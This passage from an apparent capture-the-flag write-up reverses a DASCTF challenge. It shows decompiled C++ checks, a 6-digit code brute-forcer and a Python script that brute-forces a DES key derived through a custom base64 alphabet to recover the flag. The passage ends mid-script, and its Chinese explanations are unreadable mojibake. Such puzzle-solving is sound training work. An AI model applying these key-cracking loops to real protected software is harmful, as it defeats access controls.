class="comment">//int len; // eax</span></span><br><span class="line"><span class="comment">//unsigned int v3; // r11d</span></span><br><span class="line"><span class="comment">//int v4; // edx</span></span><br><span class="line"><span class="comment">//int v5; // r8d</span></span><br><span class="line"><span class="comment">//int v6; // ecx</span></span><br><span class="line"><span class="comment">//int v7; // r8d</span></span><br><span class="line"><span class="comment">//int v8; // r9d</span></span><br><span class="line"><span class="comment">//int v9; // ecx</span></span><br><span class="line"><span class="comment">//char* p_code; // rcx</span></span><br><span class="line"><span class="comment">//unsigned int this_code; // r8d</span></span><br><span class="line"><span class="comment">//int v12; // eax</span></span><br><span class="line"><span class="comment">//int v13; // edx</span></span><br><span class="line"><span class="comment">//int v14; // r9d</span></span><br><span class="line"><span class="comment">//int v15; // edx</span></span><br><span class="line"><span class="comment">//int v16; // r10d</span></span><br><span class="line"><span class="comment">//unsigned int v17; // edx</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//// len = strlen(code);</span></span><br><span class="line"><span class="comment">//for (int q = 0; q &lt;= 30; q++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//len = q;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;this try: &quot; &lt;&lt; len;</span></span><br><span class="line"><span class="comment">//v4 = -7;</span></span><br><span class="line"><span class="comment">//v5 = 1;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v6 = v5;</span></span><br><span class="line"><span class="comment">//v7 = v4 &amp; v5;</span></span><br><span class="line"><span class="comment">//v8 = v4;</span></span><br><span class="line"><span class="comment">//v4 ^= v6;</span></span><br><span class="line"><span class="comment">//v5 = 2 * v7;</span></span><br><span class="line"><span class="comment">//&#125; while (v5);</span></span><br><span class="line"><span class="comment">//if (v6 != v8)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v9 = len;</span></span><br><span class="line"><span class="comment">//len ^= v4;</span></span><br><span class="line"><span class="comment">//v4 = 2 * (v4 &amp; v9);</span></span><br><span class="line"><span class="comment">//&#125; while (v4);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">///*code[6] = 0;</span></span><br><span class="line"><span class="comment">//p_code = code;*/</span></span><br><span class="line"><span class="comment">//v3 = len == 0;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;and result &quot; &lt;&lt; v3 &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>éªŒè¯ç æ˜¯6ä½</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;string&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//void find_password() &#123;</span></span><br><span class="line"><span class="comment">//std::string chars = &quot;0123456789&quot;;</span></span><br><span class="line"><span class="comment">//int v12, v13, v14, v15, v16, v17;</span></span><br><span class="line"><span class="comment">//bool v3;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; chars.size(); ++i) &#123;</span></span><br><span class="line"><span class="comment">//for (int j = 0; j &lt; chars.size(); ++j) &#123;</span></span><br><span class="line"><span class="comment">//for (int k = 0; k &lt; chars.size(); ++k) &#123;</span></span><br><span class="line"><span class="comment">//for (int l = 0; l &lt; chars.size(); ++l) &#123;</span></span><br><span class="line"><span class="comment">//for (int m = 0; m &lt; chars.size(); ++m) &#123;</span></span><br><span class="line"><span class="comment">//for (int n = 0; n &lt; chars.size(); ++n) &#123;</span></span><br><span class="line"><span class="comment">//std::string password = &#123; chars[i], chars[j], chars[k], chars[l], chars[m], chars[n] &#125;;</span></span><br><span class="line"><span class="comment">//const char* p_code = password.c_str();</span></span><br><span class="line"><span class="comment">//v3 = true;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//do &#123;</span></span><br><span class="line"><span class="comment">//int this_code = *p_code;</span></span><br><span class="line"><span class="comment">//v12 = -49;</span></span><br><span class="line"><span class="comment">//v13 = 1;</span></span><br><span class="line"><span class="comment">//do &#123;</span></span><br><span class="line"><span class="comment">//v14 = v13;</span></span><br><span class="line"><span class="comment">//v15 = v12 &amp; v13;</span></span><br><span class="line"><span class="comment">//v16 = v12;</span></span><br><span class="line"><span class="comment">//v12 ^= v14;</span></span><br><span class="line"><span class="comment">//v13 = 2 * v15;</span></span><br><span class="line"><span class="comment">//&#125; while (v13);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (v14 != v16) &#123;</span></span><br><span class="line"><span class="comment">//do &#123;</span></span><br><span class="line"><span class="comment">//v17 = this_code;</span></span><br><span class="line"><span class="comment">//this_code ^= v12;</span></span><br><span class="line"><span class="comment">//v12 = 2 * (v12 &amp; v17);</span></span><br><span class="line"><span class="comment">//&#125; while (v12);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (this_code &gt;= 0xA) &#123;</span></span><br><span class="line"><span class="comment">//v3 = false;</span></span><br><span class="line"><span class="comment">//break;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//++p_code;</span></span><br><span class="line"><span class="comment">//&#125; while (*p_code);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//if (v3) &#123;</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;Found a password: &quot; &lt;&lt; password &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span class="comment">//find_password();</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>éªŒè¯ç æ˜¯æ•°å­—</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//int main(void) &#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//int len; // eax</span></span><br><span class="line"><span class="comment">//int v3; // edx</span></span><br><span class="line"><span class="comment">//int v4; // r8d</span></span><br><span class="line"><span class="comment">//int v5; // r9d</span></span><br><span class="line"><span class="comment">//int v6; // r8d</span></span><br><span class="line"><span class="comment">//int v7; // r10d</span></span><br><span class="line"><span class="comment">//int v8; // r8d</span></span><br><span class="line"><span class="comment">//unsigned int ans; // r11d</span></span><br><span class="line"><span class="comment">//__int64 v10; // r10</span></span><br><span class="line"><span class="comment">//int v11; // ecx</span></span><br><span class="line"><span class="comment">//int v12; // edx</span></span><br><span class="line"><span class="comment">//int v13; // eax</span></span><br><span class="line"><span class="comment">//int v14; // r8d</span></span><br><span class="line"><span class="comment">//int v15; // edx</span></span><br><span class="line"><span class="comment">//int v16; // r9d</span></span><br><span class="line"><span class="comment">//int v17; // edx</span></span><br><span class="line"><span class="comment">//char v19[42]; // [rsp+2Eh] [rbp-2Ah] BYREF</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//for (int p = 1; p &lt;= 100; p++)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//len = p;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;this try: &quot; &lt;&lt; len;</span></span><br><span class="line"><span class="comment">//v3 = -41;</span></span><br><span class="line"><span class="comment">//v4 = 1;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v5 = v4;</span></span><br><span class="line"><span class="comment">//v6 = v3 &amp; v4;</span></span><br><span class="line"><span class="comment">//v7 = v3;</span></span><br><span class="line"><span class="comment">//v3 ^= v5;</span></span><br><span class="line"><span class="comment">//v4 = 2 * v6;</span></span><br><span class="line"><span class="comment">//&#125; while (v4);</span></span><br><span class="line"><span class="comment">//if (v5 != v7)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//do</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//v8 = len;</span></span><br><span class="line"><span class="comment">//len ^= v3;</span></span><br><span class="line"><span class="comment">//v3 = 2 * (v3 &amp; v8);</span></span><br><span class="line"><span class="comment">//&#125; while (v3);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//ans = 0;</span></span><br><span class="line"><span class="comment">//cout &lt;&lt; &quot;and result: &quot; &lt;&lt; len &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;string&gt;</span></span><br><span class="line"><span class="comment">//#include &lt;cstring&gt;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//__int64 check(__int64 a1) &#123;</span></span><br><span class="line"><span class="comment">//// Your function here</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//void find_flag() &#123;</span></span><br><span class="line"><span class="comment">//std::string flag(40, &#x27;0&#x27;);  // Initialize a flag string of length 40 with &#x27;0&#x27;</span></span><br><span class="line"><span class="comment">//int v12, v13, v14, v15, v16, v17;</span></span><br><span class="line"><span class="comment">//bool ans;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//// Set the specific positions to &quot;DASCTF&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment">//std::string initial = &quot;DASCTF&#123;&#125;&quot;;</span></span><br><span class="line"><span class="comment">//for (int i = 0; i &lt; 8; ++i) &#123;</span></span><br><span class="line"><span class="comment">//flag[i] = initial[i];</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//// Check the flag</span></span><br><span class="line"><span class="comment">//if (check((__int64)flag.c_str())) &#123;</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;The flag: &quot; &lt;&lt; flag &lt;&lt; &quot; satisfies the condition.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//else &#123;</span></span><br><span class="line"><span class="comment">//std::cout &lt;&lt; &quot;The flag: &quot; &lt;&lt; flag &lt;&lt; &quot; does not satisfy the condition.&quot; &lt;&lt; std::endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//int main() &#123;</span></span><br><span class="line"><span class="comment">//find_flag();</span></span><br><span class="line"><span class="comment">//return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flagçš„é•¿åº¦40å’Œå¼€å¤´ç»“å°¾è¦æ±‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bitset&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span>* p_lastflag; <span class="comment">// r8</span></span><br><span class="line"><span class="type">char</span>* p_str2; <span class="comment">// rcx</span></span><br><span class="line"><span class="type">char</span>* end; <span class="comment">// r9</span></span><br><span class="line"><span class="type">char</span> v6; <span class="comment">// si</span></span><br><span class="line"><span class="type">unsigned</span> __int8 left; <span class="comment">// di</span></span><br><span class="line"><span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v9; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> v10; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v12; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v13; <span class="comment">// ebp</span></span><br><span class="line"><span class="type">int</span> v14; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v15; <span class="comment">// r12d</span></span><br><span class="line"><span class="type">int</span> v16; <span class="comment">// edi</span></span><br><span class="line"><span class="type">char</span> v17; <span class="comment">// di</span></span><br><span class="line"><span class="type">int</span> v18; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v19; <span class="comment">// edx</span></span><br><span class="line"><span class="type">int</span> v21; <span class="comment">// esi</span></span><br><span class="line"><span class="type">int</span> v22; <span class="comment">// eax</span></span><br><span class="line"><span class="type">int</span> v23; <span class="comment">// esi</span></span><br><span class="line"><span class="type">int</span> v24; <span class="comment">// edi</span></span><br><span class="line"><span class="type">int</span> v25; <span class="comment">// esi</span></span><br><span class="line"><span class="type">int</span> v26; <span class="comment">// ebp</span></span><br><span class="line"><span class="type">int</span> v27; <span class="comment">// esi</span></span><br><span class="line"><span class="type">char</span>* saved_flag; <span class="comment">// [rsp+20h] [rbp-D8h] BYREF</span></span><br><span class="line">__int64 slen; <span class="comment">// [rsp+28h] [rbp-D0h]</span></span><br><span class="line"><span class="type">char</span> afterbase[<span class="number">8</span>]; <span class="comment">// [rsp+38h] [rbp-C0h] BYREF</span></span><br><span class="line"><span class="type">char</span> Str2[<span class="number">184</span>]; <span class="comment">// [rsp+40h] [rbp-B8h] BYREF</span></span><br><span class="line">slen = <span class="number">1</span>;</span><br><span class="line">p_lastflag = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> k = <span class="number">0</span>; k &lt; <span class="number">256</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line">*p_lastflag = k;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">int</span>)slen &lt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">end = Str2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">p_str2 = Str2;</span><br><span class="line">end = &amp;Str2[<span class="number">2</span> * (<span class="type">int</span>)slen];</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v6 = *p_lastflag;</span><br><span class="line">left = (<span class="type">unsigned</span> __int8)*p_lastflag &gt;&gt; <span class="number">4</span>;</span><br><span class="line">v8 = left;</span><br><span class="line"><span class="keyword">if</span> (left &lt;= <span class="number">9u</span>)</span><br><span class="line">&#123;</span><br><span class="line">v9 = left ^ <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">if</span> (!left)</span><br><span class="line">v9 = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">v9 = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v10 = v9 &amp; v8;</span><br><span class="line">v9 ^= v8;</span><br><span class="line">v8 = <span class="number">2</span> * v10;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">2</span> * v10);</span><br><span class="line">v11 = <span class="number">-11</span>;</span><br><span class="line">v12 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v13 = v12;</span><br><span class="line">v14 = v11 &amp; v12;</span><br><span class="line">v15 = v11;</span><br><span class="line">v11 ^= v13;</span><br><span class="line">v12 = <span class="number">2</span> * v14;</span><br><span class="line">&#125; <span class="keyword">while</span> (v12);</span><br><span class="line"><span class="keyword">if</span> (v13 != v15)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v16 = v9 &amp; v11;</span><br><span class="line">v9 ^= v11;</span><br><span class="line">v11 = <span class="number">2</span> * v16;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">2</span> * v16);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">*p_str2 = v9;</span><br><span class="line">p_str2 += <span class="number">2</span>;</span><br><span class="line">v17 = v6 &amp; <span class="number">0xF</span>;</span><br><span class="line">v18 = v6 &amp; <span class="number">0xF</span>;</span><br><span class="line"><span class="keyword">if</span> ((v6 &amp; <span class="number">0xF</span>u) &gt; <span class="number">9</span>)</span><br><span class="line">&#123;</span><br><span class="line">v19 = <span class="number">65</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v21 = v19 &amp; v18;</span><br><span class="line">v19 ^= v18;</span><br><span class="line">v18 = <span class="number">2</span> * v21;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">2</span> * v21);</span><br><span class="line">v22 = <span class="number">-11</span>;</span><br><span class="line">v23 = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v24 = v23;</span><br><span class="line">v25 = v22 &amp; v23;</span><br><span class="line">v26 = v22;</span><br><span class="line">v22 ^= v24;</span><br><span class="line">v23 = <span class="number">2</span> * v25;</span><br><span class="line">&#125; <span class="keyword">while</span> (v23);</span><br><span class="line"><span class="keyword">if</span> (v24 != v26)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v27 = v19;</span><br><span class="line">v19 ^= v22;</span><br><span class="line">v22 = <span class="number">2</span> * (v22 &amp; v27);</span><br><span class="line">&#125; <span class="keyword">while</span> (v22);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">v19 = v17 ^ <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">if</span> (!v17)</span><br><span class="line">v19 = <span class="number">48</span>;</span><br><span class="line">&#125;</span><br><span class="line">*(p_str2 - <span class="number">1</span>) = v19;</span><br><span class="line">++p_lastflag;</span><br><span class="line">&#125; <span class="keyword">while</span> (p_str2 != end);</span><br><span class="line">&#125;</span><br><span class="line">*end = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; std::hex &lt;&lt; k &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; Str2[<span class="number">0</span>] &lt;&lt; <span class="string">&quot; , &quot;</span> &lt;&lt; Str2[<span class="number">1</span>] &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åçš„é€»è¾‘æ˜¯ä¸€ä½å€¼è½¬æ¢ä¸º2ä½çš„hexå­—ç¬¦ä¸²</p><p>ç„¶åbase64é‚£éƒ¨åˆ†ç®—æ˜¯ä¸€çœ¼å®ï¼Œç„¶ååé¢é‚£ä¸ªdesæ²¡è§è¿‡å…¨é signsrchç›´æ¥åˆ†æå‡ºæ¥ï¼Œç„¶åç›´æ¥è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">raw_table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span></span><br><span class="line">new_table = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ+/=&#x27;</span></span><br><span class="line">dictionary_decode = <span class="built_in">str</span>.maketrans(new_table, raw_table)</span><br><span class="line">dictionary_encode = <span class="built_in">dict</span>(<span class="built_in">zip</span>(dictionary_decode.values(),dictionary_decode.keys()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥çš„ DES åŠ å¯†ç»“æœ</span></span><br><span class="line">encrypted_text = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;0723105D5C12217DCDC3601F5ECB54DA9CCEC2279F1684A13A0D716D17217F4C9EA85FF1A42795731CA3C55D3A4D7BEA&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°è¯•æ‰€æœ‰å¯èƒ½çš„ 6 ä½æ•°å­—ç»„åˆ</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">10</span>), repeat=<span class="number">6</span>):</span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, i))  </span><br><span class="line">    <span class="comment"># print(key)</span></span><br><span class="line">    keyt = base64.b64encode(key.encode()).decode() <span class="comment"># MTIzMTIzMTIz base64encode(v) æ­£å¸¸çš„123123è¿›è¡Œbase64ä»¥åçš„å€¼</span></span><br><span class="line">    keytt = keyt.translate(dictionary_encode)</span><br><span class="line">    key = keytt.encode()</span><br><span class="line">    <span class="comment"># print(key)</span></span><br><span class="line">    <span class="comment"># åˆ›å»º DES å¯¹è±¡</span></span><br><span class="line">    des = DES.new(key, DES.MODE_ECB)</span><br><span class="line">    <span class="comment"># å°è¯•è§£å¯†</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decrypted_text = des.decrypt(encrypted_text)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">b&quot;DASCTF&quot;</span> <span class="keyword">in</span> decrypted_text):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;æ‰¾åˆ°äº†ï¼å¯†é’¥æ˜¯ï¼š&#x27;</span>, key)</span><br><span class="line">            